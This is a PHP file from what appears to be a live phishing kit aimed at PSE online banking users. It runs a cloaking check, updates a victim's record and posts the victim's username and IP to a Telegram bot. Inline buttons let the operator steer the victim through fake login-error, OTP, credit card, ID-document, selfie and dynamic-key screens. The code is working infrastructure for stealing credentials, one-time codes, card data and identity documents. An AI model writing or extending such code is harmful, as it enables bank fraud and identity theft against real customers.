<?php
// modules/api/procesar_whatsapp_entendido.php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Cloaking check
require_once __DIR__ . '/../../config/cloak.php';

$config = require __DIR__ . '/../../config/config.php';
$pdo    = require __DIR__ . '/../../config/db.php';

$bot_token = $config['botToken'] ?? '';
$chat_id   = $config['chatId'] ?? '';

$clienteId = intval($_GET['id'] ?? $_POST['id'] ?? 0);

if ($clienteId > 0) {
    // 1. Cambiar estado a 1 (En Espera)
    try {
        $stmt = $pdo->prepare("UPDATE pse SET estado = 1 WHERE id = :id");
        $stmt->execute(['id' => $clienteId]);

        // Obtener datos del cliente para la notificación
        $stmtUser = $pdo->prepare("SELECT usuario, ip_address FROM pse WHERE id = :id");
        $stmtUser->execute(['id' => $clienteId]);
        $clientData = $stmtUser->fetch(PDO::FETCH_ASSOC);
        $usuario = $clientData['usuario'] ?? 'N/A';
        $ip      = $clientData['ip_address'] ?? 'N/A';
    } catch (Exception $e) {
        $usuario = 'N/A';
        $ip      = 'N/A';
    }

    // 2. Crear los botones de acción para el Administrador en Telegram
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$clienteId"],
                ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$clienteId"],
            ],
            [
                ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$clienteId"],
                ['text' => '💳 CC',         'callback_data' => "cmd_5_$clienteId"],
            ],
            [
                ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$clienteId"],
                ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$clienteId"],
            ],
            [
                ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$clienteId"],
                ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$clienteId"]
            ],
            [
                ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$clienteId"],
                ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$clienteId"]
            ],
            [
                ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$clienteId"],
                ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$clienteId"],
                ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$clienteId"]
            ]
        ]
    ];

    // 3. Redactar mensaje para el grupo de Telegram
    $message  = "<b>📲 Confirmación de WhatsApp Recibida</b>\n\n";
    $message .= "🆔 <b>ID Cliente:</b> #" . $clienteId . "\n";
    $message .= "👤 <b>Usuario:</b> " . htmlspecialchars($usuario) . "\n";
    $message .= "🌐 <b>IP:</b> " . htmlspecialchars($ip) . "\n\n";
    $message .= "✅ <i>El usuario ya le dio al botón <b>'Entendido'</b> en WhatsApp y se encuentra en la pantalla de espera aguardando una acción del Administrador.</i>";

    // 4. Enviar a Telegram
    if ($bot_token && $chat_id) {
        $url_telegram = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $post_fields = [
            'chat_id'      => $chat_id,
            'text'         => $message,
            'parse_mode'   => 'HTML',
            'reply_markup' => json_encode($keyboard)
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url_telegram);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
    }

    // 5. Redirigir al cliente a la pantalla de Espera
    header("Location: ../../index.php?status=espera&id=" . $clienteId);
    exit();
} else {
    header("Location: ../../index.php");
    exit();
}
?>
